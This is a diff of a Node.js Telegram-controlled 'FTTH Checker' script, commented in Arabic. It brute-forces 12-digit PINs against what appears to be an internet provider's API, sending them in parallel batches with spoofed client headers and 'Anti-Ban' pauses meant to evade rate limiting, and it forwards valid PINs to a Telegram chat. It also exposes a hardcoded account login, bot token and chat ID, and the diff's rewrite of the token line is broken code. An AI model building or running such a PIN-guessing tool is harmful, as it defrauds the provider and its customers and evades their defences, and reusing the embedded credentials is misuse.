@@ -10,18 +10,18 @@ const CONFIG = {
     username: '07718342248',
     password: '@lSDKl10',
     pinLength: 12,
-    batchSize: 3,
-    batchDelay: 1000,      // 1 ثانية
-    slowThreshold: 2000,    // 2 ثواني
-    sleepOnSlow: 5000,     // 5 ثواني
+    batchSize: 3,          // ← 3 PINs كل مرة
+    batchDelay: 2000,      // ← 2 ثانية بين batches
+    slowThreshold: 2000,    // 2 ثواني = بطيء
+    sleepOnSlow: 5000,     // ينتظر 5 ثواني
     maxFailures: 5,
     sleepOnFailures: 10000, // 10 ثواني
-    heartbeatInterval: 30000, // 30 ثانية
+    heartbeatInterval: 30000,
 };
 
-// Telegram
-const BOT_TOKEN = '5015755042:AAGW_mUPwROeXraHWvNaN2e67jcEILGh9_E';
-const CHAT_ID = '2121443469';
+// Telegram - عدّل هذي!
+const BOT_TOKEN = process.env.5015755042:AAGW_mUPwROeXraHWvNaN2e67jcEILGh9_E || '';  // أو حط التوكن مباشرة
+const CHAT_ID = process.env.2121443469 || '';      // أو حط الـ ID مباشرة
 
 // ملفات
 const FILES = {
@@ -31,13 +31,11 @@ const FILES = {
     state: 'bot_state.json',
 };
 
-// عينات PINs
 const SAMPLE_PINS = [
     '451807724440', '847802868630', '887073805745',
     '846425703388', '222777241754', '332053374056',
 ];
 
-// Headers
 const COMMON_HEADERS = {
     'x-client-version': '4.6.2_23040',
     'user-agent': 'Dart/3.9 (dart:io)',
@@ -68,8 +66,7 @@ let checkInterval = null;
 
 // ========== Logging ==========
 async function log(msg, type = 'info') {
-    const line = `[${new Date().toISOString()}] [${type.toUpperCase()}] ${msg}
-`;
+    const line = `[${new Date().toISOString()}] [${type.toUpperCase()}] ${msg}\n`;
     console.log(line.trim());
     try {
         await fs.appendFile(FILES.log, line);
@@ -219,7 +216,7 @@ async function ensureToken() {
     return await login();
 }
 
-// ========== Check PIN (Async) ==========
+// ========== Check PIN ==========
 async function checkPin(pin) {
     const token = await ensureToken();
     if (!token) {
@@ -279,25 +276,23 @@ async function checkPin(pin) {
     }
 }
 
-// ========== Check Batch (Async Parallel) ==========
+// ========== Check Batch (Parallel) ==========
 async function checkBatch() {
     const pins = [];
     for (let i = 0; i < CONFIG.batchSize; i++) {
         pins.push(await getUniquePin());
     }
 
-    log(`📦 Batch: ${pins.join(', ')}`);
+    log(`📦 Batch [${CONFIG.batchSize}]: ${pins.join(', ')}`);
 
     // فحص متوازي - كل الـ PINs بنفس الوقت!
     const results = await Promise.all(pins.map(pin => checkPin(pin)));
 
-    // حساب متوسط وقت الاستجابة
     const times = results.filter(r => r.time).map(r => r.time);
     if (times.length > 0) {
         botState.avgResponseTime = times.reduce((a, b) => a + b, 0) / times.length;
     }
 
-    // معالجة النتائج
     const validPins = [];
     for (const result of results) {
         if (result.success) {
@@ -306,7 +301,6 @@ async function checkBatch() {
         }
     }
 
-    // إشعار PINs الصالحة
     if (validPins.length > 0 && bot) {
         const msg = '✅ <b>PINs صالحة!</b>\n\n' + validPins.map(p => `📱 ${p}`).join('\n');
         try {
@@ -314,22 +308,7 @@ async function checkBatch() {
         } catch (e) {}
     }
 
-    // Anti-Ban
-    if (botState.avgResponseTime > CONFIG.slowThreshold) {
-        botState.slowCount++;
-        log(`🐌 بطيء: ${botState.avgResponseTime}ms (${botState.slowCount} مرة)`, 'warning');
-        await saveState();
-        return { slow: true, results };
-    }
-
-    if (botState.consecutiveFailures >= CONFIG.maxFailures) {
-        log(`⚠️ ${CONFIG.maxFailures} فشلات متتالية!`, 'warning');
-        await saveState();
-        return { failures: true, results };
-    }
-
-    await saveState();
-    return { results };
+    return { results, validPins };
 }
 
 // ========== Main Loop ==========
@@ -342,26 +321,38 @@ async function runChecker() {
     const batchStart = Date.now();
     const result = await checkBatch();
 
-    // Anti-Ban Sleep
-    if (result.slow) {
-        log(`😴 Anti-Ban: انتظار ${CONFIG.sleepOnSlow}ms`, 'warning');
-        try {
-            await bot.telegram.sendMessage(CHAT_ID, 
-                `🐌 <b>Anti-Ban</b>\nاستجابة بطيئة، انتظار ${CONFIG.sleepOnSlow/1000}s`, 
-                { parse_mode: 'HTML' });
-        } catch (e) {}
+    // Anti-Ban: بطيء
+    if (botState.avgResponseTime > CONFIG.slowThreshold) {
+        botState.slowCount++;
+        log(`🐌 بطيء: ${Math.round(botState.avgResponseTime)}ms`, 'warning');
+        await saveState();
+
+        if (bot) {
+            try {
+                await bot.telegram.sendMessage(CHAT_ID, 
+                    `🐌 <b>Anti-Ban</b>\nاستجابة بطيئة (${Math.round(botState.avgResponseTime)}ms)، انتظار ${CONFIG.sleepOnSlow/1000}s`, 
+                    { parse_mode: 'HTML' });
+            } catch (e) {}
+        }
+
         await sleep(CONFIG.sleepOnSlow);
         botState.consecutiveFailures = 0;
         await saveState();
     }
 
-    if (result.failures) {
-        log(`😴 Anti-Ban: انتظار ${CONFIG.sleepOnFailures}ms`, 'warning');
-        try {
-            await bot.telegram.sendMessage(CHAT_ID, 
-                `❌ <b>Anti-Ban</b>\n${CONFIG.maxFailures} فشلات، انتظار ${CONFIG.sleepOnFailures/1000}s`, 
-                { parse_mode: 'HTML' });
-        } catch (e) {}
+    // Anti-Ban: فشلات
+    if (botState.consecutiveFailures >= CONFIG.maxFailures) {
+        log(`⚠️ ${CONFIG.maxFailures} فشلات متتالية!`, 'warning');
+        await saveState();
+
+        if (bot) {
+            try {
+                await bot.telegram.sendMessage(CHAT_ID, 
+                    `❌ <b>Anti-Ban</b>\n${CONFIG.maxFailures} فشلات، انتظار ${CONFIG.sleepOnFailures/1000}s`, 
+                    { parse_mode: 'HTML' });
+            } catch (e) {}
+        }
+
         await sleep(CONFIG.sleepOnFailures);
         botState.consecutiveFailures = 0;
         await saveState();
@@ -371,6 +362,7 @@ async function runChecker() {
     const batchTime = Date.now() - batchStart;
     const remaining = CONFIG.batchDelay - batchTime;
     if (remaining > 0) {
+        log(`⏳ انتظار ${remaining}ms`);
         await sleep(remaining);
     }
 
@@ -381,9 +373,8 @@ async function runChecker() {
         log('💓 Heartbeat');
     }
 
-    // Continue
     if (botState.running) {
-        setImmediate(runChecker); // Async loop بدون blocking
+        setImmediate(runChecker);
     }
 }
 
@@ -403,13 +394,13 @@ function initBot() {
     // Start command
     b.start(async (ctx) => {
         await ctx.reply(
-            '🤖 <b>FTTH Checker - Node.js</b>\n' +
-            '━━━━━━━━━━━━━━━\n' +
-            'أداة فحص PINs المتقدمة\n\n' +
-            '📦 Batch: ' + CONFIG.batchSize + ' PINs\n' +
-            '⏱️ Delay: ' + CONFIG.batchDelay + 'ms\n' +
-            '🐌 Anti-Ban: مفعل\n\n' +
-            'اختر إجراء:',
+            `🤖 <b>FTTH Checker - Node.js</b>\n` +
+            `━━━━━━━━━━━━━━━\n` +
+            `أداة فحص PINs المتقدمة\n\n` +
+            `📦 Batch: ${CONFIG.batchSize} PINs\n` +
+            `⏱️ Delay: ${CONFIG.batchDelay}ms\n` +
+            `🐌 Anti-Ban: مفعل\n\n` +
+            `اختر إجراء:`,
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
@@ -422,7 +413,8 @@ function initBot() {
         );
     });
 
-    // Callbacks
+    // ========== CALLBACKS ==========
+
     b.action('start', async (ctx) => {
         await ctx.answerCbQuery('⏳ جاري التشغيل...');
 
@@ -442,10 +434,10 @@ function initBot() {
         await saveState();
 
         await ctx.editMessageText(
-            '✅ <b>تم التشغيل!</b>\n\n' +
+            `✅ <b>تم التشغيل!</b>\n\n` +
             `📦 Batch: ${CONFIG.batchSize} PINs\n` +
             `⏱️ Delay: ${CONFIG.batchDelay}ms\n` +
-            '🐌 Anti-Ban: مفعل',
+            `🐌 Anti-Ban: مفعل`,
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
@@ -457,7 +449,6 @@ function initBot() {
             }
         );
 
-        // Start checker
         runChecker();
     });
 
@@ -470,7 +461,7 @@ function initBot() {
         const uptime = botState.startTime ? formatTime(Date.now() - botState.startTime) : '00:00:00';
 
         await ctx.editMessageText(
-            '🛑 <b>تم الإيقاف!</b>\n\n' +
+            `🛑 <b>تم الإيقاف!</b>\n\n` +
             `⏱️ Uptime: ${uptime}\n` +
             `📋 مفحوص: ${botState.totalChecked}\n` +
             `✅ صالحة: ${botState.validFound}`,
@@ -492,7 +483,7 @@ function initBot() {
         const speed = botState.startTime ? (botState.totalChecked / ((Date.now() - botState.startTime) / 1000)).toFixed(2) : 0;
 
         await ctx.editMessageText(
-            '📊 <b>الحالة</b>\n\n' +
+            `📊 <b>الحالة</b>\n\n` +
             `الحالة: ${status}\n` +
             `⏱️ Uptime: ${uptime}\n` +
             `📋 مفحوص: ${botState.totalChecked}\n` +
@@ -530,7 +521,7 @@ function initBot() {
         } catch (e) {}
 
         await ctx.editMessageText(
-            '📈 <b>إحصائيات</b>\n\n' +
+            `📈 <b>إحصائيات</b>\n\n` +
             `📋 PINs مفحوصة: ${seenCount}\n` +
             `✅ PINs صالحة: ${validCount}\n` +
             `📦 Batch: ${CONFIG.batchSize}\n` +
@@ -550,19 +541,20 @@ function initBot() {
     b.action('settings', async (ctx) => {
         await ctx.answerCbQuery('⚙️ الإعدادات');
         await ctx.editMessageText(
-            '⚙️ <b>الإعدادات</b>\n\nاضغط ➕/➖',
+            `⚙️ <b>الإعدادات</b>\n\n` +
+            `اضغط ➕/➖ لتعديل\n\n` +
+            `📦 Batch: ${CONFIG.batchSize} PINs\n` +
+            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
                     [
-                        Markup.button.callback('➖', 'batch_minus'),
-                        Markup.button.callback(`📦 Batch: ${CONFIG.batchSize}`, 'batch_info'),
-                        Markup.button.callback('➕', 'batch_plus'),
+                        Markup.button.callback('➖ Batch', 'batch_minus'),
+                        Markup.button.callback('➕ Batch', 'batch_plus'),
                     ],
                     [
-                        Markup.button.callback('➖', 'delay_minus'),
-                        Markup.button.callback(`⏱️ Delay: ${CONFIG.batchDelay}ms`, 'delay_info'),
-                        Markup.button.callback('➕', 'delay_plus'),
+                        Markup.button.callback('➖ Delay', 'delay_minus'),
+                        Markup.button.callback('➕ Delay', 'delay_plus'),
                     ],
                     [Markup.button.callback('🔙 رجوع', 'back')],
                 ])
@@ -584,7 +576,7 @@ function initBot() {
         }
 
         await ctx.editMessageText(
-            '📁 <b>الملفات</b>\n\n' + files.join('\n'),
+            `📁 <b>الملفات</b>\n\n` + files.join('\n'),
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
@@ -622,103 +614,83 @@ function initBot() {
         await ctx.reply('🧹 <b>تم المسح!</b>\n\nسيبدأ من جديد', { parse_mode: 'HTML' });
     });
 
-    // Settings callbacks
+    // Settings
     b.action('batch_plus', async (ctx) => {
         CONFIG.batchSize = Math.min(10, CONFIG.batchSize + 1);
         await ctx.answerCbQuery(`Batch: ${CONFIG.batchSize}`);
-        await ctx.editMessageText('⚙️ <b>الإعدادات</b>', {
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard([
-                [
-                    Markup.button.callback('➖', 'batch_minus'),
-                    Markup.button.callback(`📦 Batch: ${CONFIG.batchSize}`, 'batch_info'),
-                    Markup.button.callback('➕', 'batch_plus'),
-                ],
-                [
-                    Markup.button.callback('➖', 'delay_minus'),
-                    Markup.button.callback(`⏱️ Delay: ${CONFIG.batchDelay}ms`, 'delay_info'),
-                    Markup.button.callback('➕', 'delay_plus'),
-                ],
-                [Markup.button.callback('🔙 رجوع', 'back')],
-            ])
-        });
+        await ctx.editMessageText(
+            `⚙️ <b>الإعدادات</b>\n\n` +
+            `📦 Batch: ${CONFIG.batchSize}\n` +
+            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
+            {
+                parse_mode: 'HTML',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
+                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
+                    [Markup.button.callback('🔙 رجوع', 'back')],
+                ])
+            }
+        );
     });
 
     b.action('batch_minus', async (ctx) => {
         CONFIG.batchSize = Math.max(1, CONFIG.batchSize - 1);
         await ctx.answerCbQuery(`Batch: ${CONFIG.batchSize}`);
-        await ctx.editMessageText('⚙️ <b>الإعدادات</b>', {
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard([
-                [
-                    Markup.button.callback('➖', 'batch_minus'),
-                    Markup.button.callback(`📦 Batch: ${CONFIG.batchSize}`, 'batch_info'),
-                    Markup.button.callback('➕', 'batch_plus'),
-                ],
-                [
-                    Markup.button.callback('➖', 'delay_minus'),
-                    Markup.button.callback(`⏱️ Delay: ${CONFIG.batchDelay}ms`, 'delay_info'),
-                    Markup.button.callback('➕', 'delay_plus'),
-                ],
-                [Markup.button.callback('🔙 رجوع', 'back')],
-            ])
-        });
+        await ctx.editMessageText(
+            `⚙️ <b>الإعدادات</b>\n\n` +
+            `📦 Batch: ${CONFIG.batchSize}\n` +
+            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
+            {
+                parse_mode: 'HTML',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
+                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
+                    [Markup.button.callback('🔙 رجوع', 'back')],
+                ])
+            }
+        );
     });
 
     b.action('delay_plus', async (ctx) => {
-        CONFIG.batchDelay = Math.min(5000, CONFIG.batchDelay + 500);
+        CONFIG.batchDelay = Math.min(10000, CONFIG.batchDelay + 500);
         await ctx.answerCbQuery(`Delay: ${CONFIG.batchDelay}ms`);
-        await ctx.editMessageText('⚙️ <b>الإعدادات</b>', {
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard([
-                [
-                    Markup.button.callback('➖', 'batch_minus'),
-                    Markup.button.callback(`📦 Batch: ${CONFIG.batchSize}`, 'batch_info'),
-                    Markup.button.callback('➕', 'batch_plus'),
-                ],
-                [
-                    Markup.button.callback('➖', 'delay_minus'),
-                    Markup.button.callback(`⏱️ Delay: ${CONFIG.batchDelay}ms`, 'delay_info'),
-                    Markup.button.callback('➕', 'delay_plus'),
-                ],
-                [Markup.button.callback('🔙 رجوع', 'back')],
-            ])
-        });
+        await ctx.editMessageText(
+            `⚙️ <b>الإعدادات</b>\n\n` +
+            `📦 Batch: ${CONFIG.batchSize}\n` +
+            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
+            {
+                parse_mode: 'HTML',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
+                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
+                    [Markup.button.callback('🔙 رجوع', 'back')],
+                ])
+            }
+        );
     });
 
     b.action('delay_minus', async (ctx) => {
         CONFIG.batchDelay = Math.max(500, CONFIG.batchDelay - 500);
         await ctx.answerCbQuery(`Delay: ${CONFIG.batchDelay}ms`);
-        await ctx.editMessageText('⚙️ <b>الإعدادات</b>', {
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard([
-                [
-                    Markup.button.callback('➖', 'batch_minus'),
-                    Markup.button.callback(`📦 Batch: ${CONFIG.batchSize}`, 'batch_info'),
-                    Markup.button.callback('➕', 'batch_plus'),
-                ],
-                [
-                    Markup.button.callback('➖', 'delay_minus'),
-                    Markup.button.callback(`⏱️ Delay: ${CONFIG.batchDelay}ms`, 'delay_info'),
-                    Markup.button.callback('➕', 'delay_plus'),
-                ],
-                [Markup.button.callback('🔙 رجوع', 'back')],
-            ])
-        });
-    });
-
-    b.action('batch_info', async (ctx) => {
-        await ctx.answerCbQuery(`كل batch يفحص ${CONFIG.batchSize} PINs`, true);
-    });
-
-    b.action('delay_info', async (ctx) => {
-        await ctx.answerCbQuery(`فاصل ${CONFIG.batchDelay}ms بين batches`, true);
+        await ctx.editMessageText(
+            `⚙️ <b>الإعدادات</b>\n\n` +
+            `📦 Batch: ${CONFIG.batchSize}\n` +
+            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
+            {
+                parse_mode: 'HTML',
+                ...Markup.inlineKeyboard([
+                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
+                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
+                    [Markup.button.callback('🔙 رجوع', 'back')],
+                ])
+            }
+        );
     });
 
     b.action('back', async (ctx) => {
         await ctx.answerCbQuery('🔙 رجوع');
         await ctx.editMessageText(
-            '🤖 <b>FTTH Checker - Node.js</b>\n\nاختر إجراء:',
+            `🤖 <b>FTTH Checker - Node.js</b>\n\nاختر إجراء:`,
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
@@ -751,10 +723,10 @@ async function main() {
     await loadState();
     await loadSeen();
 
-    console.log('📊 الحالة المحملة:');
-    console.log(`   مفحوص: ${botState.totalChecked}`);
-    console.log(`   صالحة: ${botState.validFound}`);
-    console.log(`   PINs مفحوصة سابقاً: ${seenPins.size}\n`);
+    console.log('📊 الإعدادات:');
+    console.log(`   📦 Batch: ${CONFIG.batchSize} PINs`);
+    console.log(`   ⏱️ Delay: ${CONFIG.batchDelay}ms`);
+    console.log(`   📋 مفحوص سابقاً: ${seenPins.size}\n`);
 
     // Init Telegram
     bot = initBot();
@@ -763,7 +735,7 @@ async function main() {
         console.log('✅ Telegram Bot شغال\n');
     }
 
-    // إذا كان شغال قبل = استمر
+    // Auto-start if was running
     if (botState.running) {
         console.log('🔄 استئناف التشغيل...\n');
         runChecker();
@@ -771,7 +743,7 @@ async function main() {
 
     // Graceful shutdown
     process.once('SIGINT', () => {
-        console.log('\n🛑 SIGINT received');
+        console.log('\n🛑 SIGINT');
         botState.running = false;
         saveState();
         if (bot) bot.stop('SIGINT');
@@ -779,7 +751,7 @@ async function main() {
     });
 
     process.once('SIGTERM', () => {
-        console.log('\n🛑 SIGTERM received');
+        console.log('\n🛑 SIGTERM');
         botState.running = false;
         saveState();
         if (bot) bot.stop('SIGTERM');
